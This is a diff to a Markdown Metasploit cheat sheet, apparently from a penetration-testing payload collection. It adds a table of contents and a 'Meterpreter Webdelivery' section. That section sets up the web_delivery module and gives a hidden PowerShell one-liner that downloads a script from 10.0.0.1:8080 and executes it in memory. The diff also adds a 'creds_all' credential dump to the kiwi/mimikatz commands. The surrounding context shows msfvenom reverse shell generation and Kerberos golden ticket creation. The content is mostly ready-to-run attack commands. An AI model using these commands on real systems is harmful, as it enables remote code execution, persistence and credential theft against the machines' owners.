@@ -1,5 +1,25 @@
 # Metasploit
 
+## Summary
+
+* [Installation](#installation)
+* [Sessions](#sessions)
+* [Background handler](#background-handler)
+* [Meterpreter - Basic](#meterpreter---basic)
+    * [Generate a meterpreter](#generate-a-meterpreter)
+    * [Meterpreter Webdelivery](#meterpreter-webdelivery)
+    * [Get System](#get-system)
+    * [Persistence Startup](#persistence-startup)
+    * [Portforward](#portforward)
+    * [Upload / Download](#upload---download)
+    * [Execute from Memory](#execute-from-memory)
+    * [Mimikatz](#mimikatz)
+    * [Pass the Hash - PSExec](#pass-the-hash---psexec)
+* [Scripting Metasploit](#scripting-metasploit)
+* [Multiple transports](#multiple-transports)
+* [Best of - Exploits](#best-of---exploits)
+* [References](#references)
+
 ## Installation
 
 ```powershell
@@ -25,7 +45,7 @@ sessions -c cmd           -> Execute a command on several sessions
 sessions -i 10-20 -c "id" -> Execute a command on several sessions
 ```
 
-## Multi/handler in background (screen/tmux)
+## Background handler
 
 ExitOnSession : the handler will not exit if the meterpreter dies.
 
@@ -60,7 +80,25 @@ $ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > she
 $ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
 ```
 
-### SYSTEM / Administrator privilege
+### Meterpreter Webdelivery
+
+Set up a Powershell web delivery listening on port 8080.
+
+```powershell
+use exploit/multi/script/web_delivery
+set TARGET 2
+set payload windows/x64/meterpreter/reverse_http
+set LHOST 10.0.0.1
+set LPORT 4444
+run
+```
+
+```powershell
+powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
+```
+
+
+### Get System
 
 ```powershell
 meterpreter > getsystem
@@ -120,6 +158,7 @@ mimikatz_command -f sekurlsa::searchPasswords
 
 ```powershell
 load kiwi
+creds_all
 golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
 ```
 
